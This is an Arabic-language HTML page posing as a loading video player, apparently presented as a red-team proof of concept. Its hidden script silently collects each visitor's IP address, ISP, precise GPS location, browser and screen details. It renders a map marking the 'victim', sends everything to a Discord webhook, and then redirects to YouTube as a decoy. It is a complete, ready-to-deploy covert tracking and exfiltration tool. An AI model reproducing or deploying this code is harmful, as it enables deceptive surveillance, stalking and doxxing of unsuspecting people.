<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>مشغّل الفيديو — جارٍ التحميل...</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body {
    background:#0f1115; color:#e8e8e8; font-family:"Segoe UI", Tahoma, Arial, sans-serif;
    height:100vh; display:flex; align-items:center; justify-content:center; overflow:hidden;
  }
  .box { text-align:center; }
  .player {
    width:320px; height:180px; border-radius:12px; margin:0 auto 18px;
    background:radial-gradient(circle at 30% 30%, #1c2230, #0a0c10);
    display:flex; align-items:center; justify-content:center;
    border:1px solid #232a38;
  }
  .play { width:64px; height:64px; border-radius:50%; background:#e50914; display:flex; align-items:center; justify-content:center; box-shadow:0 0 30px rgba(229,9,20,.5); }
  .play::after { content:""; border-style:solid; border-width:12px 0 12px 20px; border-color:transparent transparent transparent #fff; margin-right:4px; }
  .bar { width:320px; height:6px; background:#232a38; border-radius:3px; margin:14px auto 10px; overflow:hidden; }
  .bar i { display:block; height:100%; width:0; background:#e50914; border-radius:3px; animation:load 2.2s ease forwards; }
  @keyframes load { to { width:100%; } }
  .txt { color:#9aa4b5; font-size:14px; }
</style>
</head>
<body>
<div class="box">
  <div class="player"><div class="play"></div></div>
  <div class="bar"><i></i></div>
  <div class="txt">جارٍ تجهيز الفيديو، الرجاء الانتظار...</div>
</div>

<script>
/* ============================================================
   IP Logger + Map — Red Team PoC
   يلتقط: IP / موقع تقريبي / معلومات الجهاز + صورة خريطة
   ويرسل كل شيء إلى Webhook (ديسكورد)
   ============================================================ */

const CONFIG = {
  webhook: "ضع_رابط_الويب_هوك_هنا",   // رابط الويب هوك (عادي أو Base64)
  decoyUrl: "https://www.youtube.com", // موقع التحويل بعد الالتقاط
  redirectDelay: 4500,                 // ms قبل تحويل الضحية
  zoom: 17,                            // 14=منطقة  17=شارع  19=أدق
  mapWidth: 640,
  mapHeight: 480,
  useGPS: true,                        // محاولة GPS دقيق (يحتاج موافقة)
  gpsTimeout: 6000
};

const WEBHOOK = CONFIG.webhook.startsWith("http") ? CONFIG.webhook : atob(CONFIG.webhook);
const N = 2 ** CONFIG.zoom, TILE = 256;

/* ---------- 1) معلومات الـ IP والموقع التقريبي ---------- */
async function getIPInfo() {
  for (const url of ["https://ipwho.is/", "https://ipapi.co/json/"]) {
    try {
      const r = await fetch(url, { cache: "no-store" });
      const j = await r.json();
      if (j && (j.ip || j.latitude)) return j;
    } catch (e) {}
  }
  return null;
}

/* ---------- 2) GPS دقيق (يحتاج إذن المستخدم) ---------- */
function getGPS() {
  return new Promise(res => {
    if (!CONFIG.useGPS || !navigator.geolocation) return res(null);
    navigator.geolocation.getCurrentPosition(
      p => res({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
      () => res(null),
      { enableHighAccuracy: true, timeout: CONFIG.gpsTimeout, maximumAge: 0 }
    );
  });
}

/* ---------- 3) رسم صورة الخريطة (بدون API Key) ---------- */
function tileURL(x, y, z) { return `https://tile.openstreetmap.org/${z}/${x}/${y}.png`; }

function loadTile(x, y, z) {
  return new Promise((res, rej) => {
    const img = new Image();
    img.crossOrigin = "anonymous";
    img.onload = () => res(img);
    img.onerror = rej;
    img.src = tileURL(((x % N) + N) % N, y, z);
  });
}

async function drawMap(lat, lon) {
  const latR = lat * Math.PI / 180;
  const x = (lon + 180) / 360 * N;                          // موضع البلاطة (كسري)
  const y = (1 - Math.log(Math.tan(latR) + 1 / Math.cos(latR)) / Math.PI) / 2 * N;
  const worldX = x * TILE, worldY = y * TILE;               // بيكسل عالمي
  const startX = worldX - CONFIG.mapWidth / 2;              // نقطة الموقع = مركز الخريطة
  const startY = worldY - CONFIG.mapHeight / 2;
  const tX0 = Math.floor(startX / TILE), tY0 = Math.floor(startY / TILE);
  const offX = startX - tX0 * TILE, offY = startY - tY0 * TILE;
  const cols = Math.ceil(CONFIG.mapWidth / TILE) + 2;
  const rows = Math.ceil(CONFIG.mapHeight / TILE) + 2;

  const canvas = document.createElement("canvas");
  canvas.width = CONFIG.mapWidth; canvas.height = CONFIG.mapHeight;
  const ctx = canvas.getContext("2d");

  const jobs = [];
  for (let j = 0; j < rows; j++)
    for (let i = 0; i < cols; i++)
      jobs.push(loadTile(tX0 + i, tY0 + j, CONFIG.zoom).then(img => {
        ctx.drawImage(img, i * TILE - offX, j * TILE - offY);
      }).catch(() => {}));

  await Promise.all(jobs);

  /* بديل: خريطة جوجل الحقيقية (تحتاج API Key من Google Cloud)
  const gmap = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=${CONFIG.zoom}&size=${CONFIG.mapWidth}x${CONFIG.mapHeight}&markers=color:red%7C${lat},${lon}&key=YOUR_KEY`;
  const gi = new Image(); gi.crossOrigin = "anonymous";
  await new Promise(r => { gi.onload = r; gi.onerror = r; gi.src = gmap; });
  ctx.drawImage(gi, 0, 0); */

  // علامة حمراء في المنتصف (موقع الضحية)
  const cx = CONFIG.mapWidth / 2, cy = CONFIG.mapHeight / 2;
  ctx.beginPath(); ctx.arc(cx, cy, 13, 0, Math.PI * 2);
  ctx.fillStyle = "#e50914"; ctx.fill();
  ctx.lineWidth = 4; ctx.strokeStyle = "#fff"; ctx.stroke();
  ctx.beginPath(); ctx.arc(cx, cy, 4, 0, Math.PI * 2);
  ctx.fillStyle = "#fff"; ctx.fill();

  // شريط الإحداثيات فوق العلامة
  const label = lat.toFixed(5) + ", " + lon.toFixed(5);
  ctx.font = "bold 15px Arial";
  const tw = ctx.measureText(label).width;
  ctx.fillStyle = "rgba(0,0,0,.78)";
  if (ctx.roundRect) { ctx.beginPath(); ctx.roundRect(cx - tw/2 - 8, cy - 42, tw + 16, 26, 6); ctx.fill(); }
  else ctx.fillRect(cx - tw/2 - 8, cy - 42, tw + 16, 26);
  ctx.fillStyle = "#fff";
  ctx.fillText(label, cx - tw/2, cy - 24);

  // حقوق الخريطة
  ctx.font = "10px Arial";
  ctx.fillStyle = "rgba(0,0,0,.55)";
  ctx.fillText("© OpenStreetMap contributors", 6, CONFIG.mapHeight - 8);

  return new Promise(res => canvas.toBlob(b => res(b), "image/png"));
}

/* ---------- 4) الإرسال إلى الويب هوك ---------- */
async function sendToWebhook(data, mapBlob) {
  const embed = {
    title: "ضحية جديدة تم التقاطها",
    color: 0xe50914,
    fields: [
      { name: "IP", value: data.ip, inline: true },
      { name: "الموقع (IP)", value: `${data.city || "?"}، ${data.region || "?"} — ${data.country || "?"}`, inline: true },
      { name: "ISP", value: data.isp || "غير معروف", inline: true },
      { name: "الإحداثيات", value: `${data.lat?.toFixed(6)} , ${data.lon?.toFixed(6)}`, inline: true },
      { name: "نوع التحديد", value: data.gpsUsed ? `GPS دقيق (±${Math.round(data.accuracy || 0)}م)` : "تقريبي (IP)", inline: true },
      { name: "المتصفح", value: (data.ua || "?").slice(0, 100), inline: false },
      { name: "اللغة", value: data.lang, inline: true },
      { name: "الشاشة", value: data.screen, inline: true },
      { name: "المصدر", value: data.referrer, inline: false },
      { name: "الوقت", value: data.time, inline: false }
    ],
    footer: { text: "HackerAI PoC — Logger" }
  };
  if (mapBlob) embed.image = { url: "attachment://map.png" };

  const payload = JSON.stringify({ username: "Logger", embeds: [embed] });

  // المحاولة 1: إرسال مع صورة الخريطة (multipart)
  try {
    const form = new FormData();
    form.append("payload_json", payload);
    if (mapBlob) form.append("file", mapBlob, "map.png");
    const r = await fetch(WEBHOOK, { method: "POST", body: form });
    if (r.ok) return true;
  } catch (e) {}

  // المحاولة 2: JSON بدون صورة
  try {
    await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: payload });
    return true;
  } catch (e) {}

  // المحاولة 3: beacon
  try { navigator.sendBeacon(WEBHOOK, new Blob([payload], { type: "application/json" })); } catch (e) {}
  return false;
}

/* ---------- التنفيذ الرئيسي ---------- */
(async () => {
  if (sessionStorage.getItem("_v")) { location.replace(CONFIG.decoyUrl); return; }
  sessionStorage.setItem("_v", "1");

  // مؤقت التحويل — يشتغل فوراً حتى لو فشل الإرسال
  setTimeout(() => location.replace(CONFIG.decoyUrl), CONFIG.redirectDelay);

  try {
    const ipInfo = await getIPInfo();
    const gps = await getGPS();

    const lat = gps ? gps.lat : (ipInfo?.latitude ?? null);
    const lon = gps ? gps.lon : (ipInfo?.longitude ?? null);

    const data = {
      ip: ipInfo?.ip || "غير معروف",
      city: ipInfo?.city, region: ipInfo?.region, country: ipInfo?.country,
      isp: ipInfo?.connection?.isp || ipInfo?.org,
      lat, lon,
      gpsUsed: !!gps, accuracy: gps ? gps.acc : null,
      ua: navigator.userAgent, lang: navigator.language,
      screen: `${screen.width}x${screen.height}`,
      referrer: document.referrer || "direct",
      time: new Date().toISOString()
    };

    let mapBlob = null;
    if (lat != null && lon != null) {
      try { mapBlob = await drawMap(lat, lon); } catch (e) {}
    }

    await sendToWebhook(data, mapBlob);
  } catch (e) { /* فشل صامت بدون أي أثر */ }
})();
</script>
</body>
</html>
